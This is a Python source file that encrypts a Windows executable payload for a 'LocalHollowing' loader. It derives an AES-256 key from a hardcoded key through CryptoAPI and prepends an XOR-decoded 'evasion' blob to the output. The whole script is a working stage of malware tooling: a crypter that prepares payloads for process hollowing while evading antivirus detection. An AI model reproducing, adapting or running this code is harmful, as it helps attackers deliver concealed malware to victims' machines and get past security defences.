"""
Encrypt a PE payload for the LocalHollowing loader.
Uses Windows CryptoAPI (same as the loader's decryption).
Output: [4B evasion_size][raw evasion][encrypted PE]
"""
import sys, struct, ctypes, ctypes.wintypes as wt, os

PROV_RSA_AES = 24
CRYPT_VERIFYCONTEXT = 0xF0000000
CALG_SHA1 = 0x8004
CALG_AES_256 = 0x6610
HP_HASHVAL = 0x0002

advapi32 = ctypes.WinDLL("advapi32")

KEY = bytes([0x74,0x69,0x02,0x0D,0x9F,0x7A,0x8F,0x57,0x38,0xC6,0xBC,0xA1,0x21,0x9C,0x00,0x5F])

def encrypt_pe(pe_data):
    hProv = wt.HANDLE()
    advapi32.CryptAcquireContextW(ctypes.byref(hProv), None, None, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)

    hHash = wt.HANDLE()
    advapi32.CryptCreateHash(hProv, CALG_SHA1, 0, 0, ctypes.byref(hHash))
    advapi32.CryptHashData(hHash, KEY, len(KEY), 0)

    hKey = wt.HANDLE()
    advapi32.CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, ctypes.byref(hKey))

    buf = ctypes.create_string_buffer(pe_data, len(pe_data) + 32)
    enc_len = wt.DWORD(len(pe_data))
    advapi32.CryptEncrypt(hKey, 0, True, 0, buf, ctypes.byref(enc_len), len(pe_data) + 32)

    advapi32.CryptDestroyKey(hKey)
    advapi32.CryptDestroyHash(hHash)
    advapi32.CryptReleaseContext(hProv, 0)

    return buf.raw[:enc_len.value]

def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <input.exe> <output.bin>")
        sys.exit(1)

    pe_path = sys.argv[1]
    out_path = sys.argv[2]

    evasion_blob = os.path.join(os.path.dirname(__file__), "LocalHollowing", "evasion_blob.bin")
    blob = open(evasion_blob, "rb").read()
    raw_evasion = bytes(b ^ 0xBE for b in blob[4:])

    pe_data = open(pe_path, "rb").read()
    print(f"[+] PE: {len(pe_data)} bytes ({len(pe_data)//1024} KB)")

    encrypted = encrypt_pe(pe_data)
    print(f"[+] Encrypted: {len(encrypted)} bytes")

    with open(out_path, "wb") as f:
        f.write(struct.pack("<I", len(raw_evasion)))
        f.write(raw_evasion)
        f.write(encrypted)

    print(f"[+] Output: {out_path} ({os.path.getsize(out_path)} bytes)")

if __name__ == "__main__":
    main()
